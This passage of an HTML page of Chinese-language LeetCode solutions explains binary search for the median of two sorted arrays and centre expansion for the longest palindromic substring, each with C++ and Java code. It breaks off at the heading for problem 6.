punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4. 寻找两个正序数组的中位数"></a><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a></h3><h4 id="解题步骤：二分查找法"><a href="#解题步骤：二分查找法" class="headerlink" title="解题步骤：二分查找法"></a>解题步骤：二分查找法</h4><ol><li><strong>中位数转为找第 k 小元素的问题：</strong><ul><li>奇数长度：中位数是第 <code>(m + n + 1)/2</code> 个。</li><li>偶数长度：中位数是第 <code>(m+n)/2</code> 和 <code>(m+n)/2 + 1</code> 个数的平均值。</li></ul></li><li><strong>使用二分查找来找第 k 小元素：</strong><ul><li>比较 <code>nums1[k/2 - 1]</code> 和 <code>nums2[k/2 - 1]</code>。</li><li>较小的一侧可以排除掉前 <code>k/2</code> 个元素。</li><li>不断更新 <code>k</code>、起始索引直到找到第 k 小的元素。</li></ul></li><li><strong>终止条件处理：</strong><ul><li>如果某个数组已经遍历完了，直接在另一个数组找。</li><li>如果 <code>k == 1</code>，取两个当前起始位置最小的元素返回。</li></ul></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">double</span> <span class="token function">findMedianSortedArrays</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> total <span class="token operator">=</span> nums1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> nums2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>total <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">getKthElement</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> total <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">getKthElement</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> total <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span>                    <span class="token function">getKthElement</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> total <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2.0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getKthElement</span><span class="token punctuation">(</span><span class="token keyword">const</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums1<span class="token punctuation">,</span> <span class="token keyword">const</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums2<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> index1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> index2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> nums1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n <span class="token operator">=</span> nums2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>index1 <span class="token operator">==</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> nums2<span class="token punctuation">[</span>index2 <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>index2 <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> nums1<span class="token punctuation">[</span>index1 <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">min</span><span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>index1<span class="token punctuation">]</span><span class="token punctuation">,</span> nums2<span class="token punctuation">[</span>index2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">int</span> newIndex1 <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>index1 <span class="token operator">+</span> k <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> newIndex2 <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>index2 <span class="token operator">+</span> k <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> pivot1 <span class="token operator">=</span> nums1<span class="token punctuation">[</span>newIndex1<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> pivot2 <span class="token operator">=</span> nums2<span class="token punctuation">[</span>newIndex2<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>pivot1 <span class="token operator">&lt;=</span> pivot2<span class="token punctuation">)</span> <span class="token punctuation">{</span>                k <span class="token operator">-=</span> <span class="token punctuation">(</span>newIndex1 <span class="token operator">-</span> index1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                index1 <span class="token operator">=</span> newIndex1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                k <span class="token operator">-=</span> <span class="token punctuation">(</span>newIndex2 <span class="token operator">-</span> index2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                index2 <span class="token operator">=</span> newIndex2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">findMedianSortedArrays</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums1<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> nums1<span class="token punctuation">.</span>length <span class="token operator">+</span> nums2<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">findPos</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2 <span class="token punctuation">,</span>length <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">findPos</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">findPos</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> nums2<span class="token punctuation">,</span> length <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">findPos</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums1<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums2<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> index1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> index2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> m <span class="token operator">=</span> nums1<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token keyword">int</span> n <span class="token operator">=</span> nums2<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>index1 <span class="token operator">==</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> nums2<span class="token punctuation">[</span>index2 <span class="token operator">+</span> pos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>index2 <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> nums1<span class="token punctuation">[</span>index1 <span class="token operator">+</span> pos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>index1<span class="token punctuation">]</span><span class="token punctuation">,</span> nums2<span class="token punctuation">[</span>index2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> newIndex1 <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>index1 <span class="token operator">+</span> pos <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> newIndex2 <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>index2 <span class="token operator">+</span> pos <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>newIndex1<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> nums2<span class="token punctuation">[</span>newIndex2<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>pos <span class="token operator">-=</span> <span class="token punctuation">(</span>newIndex1 <span class="token operator">-</span> index1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>index1 <span class="token operator">=</span> newIndex1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>pos <span class="token operator">-=</span> <span class="token punctuation">(</span>newIndex2 <span class="token operator">-</span> index2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>index2 <span class="token operator">=</span> newIndex2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-最长回文子串"><a href="#5-最长回文子串" class="headerlink" title="5. 最长回文子串"></a><a href="https://leetcode.cn/problems/longest-palindromic-substring/">5. 最长回文子串</a></h3><h4 id="解题步骤：中心扩展法"><a href="#解题步骤：中心扩展法" class="headerlink" title="解题步骤：中心扩展法"></a>解题步骤：中心扩展法</h4><ol><li><strong>初始化答案字符串</strong>：<ul><li>如果字符串为空或长度为 1，直接返回；</li><li>初始化结果 <code>ans</code> 为第一个字符（确保至少有一个回文子串）。</li></ul></li><li><strong>遍历字符串，尝试以每个字符为中心向两边扩展（奇数长度的回文）</strong>：<ul><li>设当前字符下标为 <code>i</code>，左右指针分别为 <code>j = i - 1</code> 和 <code>k = i + 1</code>；</li><li>当左右指针在范围内，且 <code>s[j] == s[k]</code>，说明是回文，继续扩展；</li><li>若扩展后回文长度 <code>count</code> 大于当前最长 <code>ans</code>，更新 <code>ans</code> 为新的回文子串。</li></ul></li><li><strong>遍历字符串，尝试以每对相邻字符为中心扩展（偶数长度的回文）</strong>：<ul><li>若相邻两个字符 <code>s[i] == s[i+1]</code>，从这对字符出发进行中心扩展；</li><li>左右指针设置为 <code>j = i - 1</code> 和 <code>k = i + 2</code>，以同样的方式向外扩展；</li><li>更新最长回文子串 <code>ans</code>。</li></ul></li><li>**返回最终的最长回文子串 <code>ans</code>**。</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    string <span class="token function">longestPalindrome</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> s<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        string ans<span class="token punctuation">;</span>        ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> k <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    count <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>                    j<span class="token operator">--</span><span class="token punctuation">;</span>                    k<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">&gt;</span> ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                ans <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> count<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                count <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> k <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    count <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>                    j<span class="token operator">--</span><span class="token punctuation">;</span>                    k<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">&gt;</span> ans<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                ans <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">longestPalindrome</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> length <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">String</span> ans <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>ans <span class="token operator">+=</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> k <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>count <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">&gt;</span> ans<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ans <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> count<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>count <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> k <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>count <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">&gt;</span> ans<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ans <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-Z-字形变换"><a href="#6-Z-字形变换" class="headerlink" title="6. Z 字形变换"></a><a 